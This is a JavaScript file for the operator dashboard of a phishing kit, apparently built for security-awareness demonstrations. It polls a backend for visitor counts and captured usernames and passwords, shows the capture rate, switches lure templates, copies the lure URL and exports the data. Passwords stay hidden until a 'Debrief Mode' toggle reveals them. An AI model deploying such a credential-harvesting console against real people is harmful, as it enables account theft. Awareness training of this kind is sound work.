let debriefMode = false;

function fetchStats() {
    fetch('/api/stats')
        .then(r => r.json())
        .then(data => {
            updateStats(data);
            updateVisitorTable(data.visitors);
            updateCaptureTable(data.captures);
            updateBrowserChart(data.browsers);
            updateTemplateChart(data.visitor_by_template);
            updateFeedStatus(data);
        })
        .catch(() => {});
}

function updateStats(data) {
    document.getElementById('statVisitors').textContent = data.total_visitors;
    document.getElementById('statCaptures').textContent = data.total_captures;
    const rate = data.total_visitors > 0
        ? Math.round((data.total_captures / data.total_visitors) * 100) + '%'
        : '0%';
    document.getElementById('statRate').textContent = rate;
}

function setTemplate(tpl) {
    fetch('/api/set-template', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({template: tpl})
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'ok') {
            updateActiveTemplate(data.template);
        }
    })
    .catch(() => {});
}

function updateActiveTemplate(tpl) {
    document.querySelectorAll('.tpl-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.template === tpl);
    });
    document.getElementById('statTemplates').textContent =
        document.querySelector(`.tpl-btn[data-template="${tpl}"] .tpl-name`)?.textContent || tpl;
    document.getElementById('activeUrl').textContent =
        window.location.origin.replace('/dashboard', '') + '/';
}

function fetchActiveTemplate() {
    fetch('/api/active-template')
        .then(r => r.json())
        .then(data => updateActiveTemplate(data.template))
        .catch(() => {});
}

function copyUrl() {
    const code = document.getElementById('activeUrl');
    const url = code.textContent;
    navigator.clipboard.writeText(url).then(() => {
        code.style.borderColor = '#22c55e';
        code.style.color = '#22c55e';
        setTimeout(() => { code.style.borderColor = ''; code.style.color = ''; }, 1500);
    }).catch(() => {});
}

function updateVisitorTable(visitors) {
    const tbody = document.getElementById('visitorTable');
    if (!visitors.length) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#6b7280;padding:20px">Belum ada pengunjung</td></tr>';
        return;
    }
    tbody.innerHTML = visitors.map((v, i) => {
        const ua = v.user_agent || '';
        let browser = 'Chrome';
        if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        return `<tr><td>${i + 1}</td><td>${v.template}</td><td>${browser}</td><td>${(v.timestamp || '').slice(0, 19)}</td></tr>`;
    }).join('');
}

function updateCaptureTable(captures) {
    const tbody = document.getElementById('captureTable');
    const overlay = document.getElementById('debriefOverlay');
    if (!captures.length) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#6b7280;padding:20px">Belum ada data credential</td></tr>';
        if (overlay) overlay.style.display = 'none';
        return;
    }
    tbody.innerHTML = captures.map((c, i) => {
        const pw = debriefMode ? c.password : '••••••••';
        return `<tr><td>${i + 1}</td><td>${c.template}</td><td>${c.username}</td><td>${pw}</td><td>${(c.timestamp || '').slice(0, 19)}</td></tr>`;
    }).join('');
    if (overlay) overlay.style.display = debriefMode ? 'none' : 'block';
}

function updateBrowserChart(browsers) {
    const el = document.getElementById('browserChart');
    const entries = Object.entries(browsers);
    if (!entries.length) {
        el.innerHTML = '<p style="color:#6b7280;font-size:13px">Belum ada data</p>';
        return;
    }
    const max = Math.max(...entries.map(([, v]) => v));
    const colors = { Chrome: '#3b82f6', Firefox: '#f97316', Edge: '#22c55e', Safari: '#a855f7', Opera: '#ef4444', Lainnya: '#6b7280' };
    el.innerHTML = entries.map(([name, count]) => {
        const h = max > 0 ? (count / max) * 100 : 0;
        const color = colors[name] || '#6b7280';
        return `<div class="bar-item"><div class="bar" style="height:${Math.max(h, 4)}px;background:${color}"></div><span class="value">${count}</span><span class="label">${name}</span></div>`;
    }).join('');
}

function updateTemplateChart(vt) {
    const el = document.getElementById('templateChart');
    const entries = Object.entries(vt);
    if (!entries.length) {
        el.innerHTML = '<p style="color:#6b7280;font-size:13px">Belum ada data</p>';
        return;
    }
    el.innerHTML = '<ul class="tpl-list">' + entries.map(([name, count]) => {
        return `<li><span class="tpl-name">${name}</span><span class="tpl-count">${count}</span></li>`;
    }).join('') + '</ul>';
}

function updateFeedStatus(data) {
    const el = document.getElementById('feedStatus');
    const total = data.total_visitors + data.total_captures;
    if (total === 0) {
        el.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menunggu pengunjung... Bagikan URL ke audiens!';
    } else {
        el.innerHTML = '<i class="fa-solid fa-check-circle" style="color:#22c55e"></i> Live — ' + new Date().toLocaleTimeString('id-ID');
    }
}

document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            const target = this.dataset.tab;
            document.getElementById('tabVisitors').style.display = target === 'visitors' ? 'block' : 'none';
            document.getElementById('tabCaptures').style.display = target === 'captures' ? 'block' : 'none';
        });
    });

    document.getElementById('btnDebrief').addEventListener('click', function() {
        debriefMode = !debriefMode;
        this.textContent = debriefMode ? 'Sembunyikan' : 'Debrief Mode';
        this.style.background = debriefMode ? '#22c55e' : '#f59e0b';
        fetchStats();
    });

    document.getElementById('btnReset').addEventListener('click', function() {
        if (confirm('Reset semua data? Aksi ini tidak bisa dibatalkan.')) {
            fetch('/api/reset', { method: 'POST' })
                .then(() => fetchStats())
                .catch(() => {});
        }
    });

    document.getElementById('btnExport').addEventListener('click', function() {
        window.open('/api/export', '_blank');
    });

    fetchActiveTemplate();
    fetchStats();
    setInterval(fetchActiveTemplate, 3000);
    setInterval(fetchStats, 1500);
});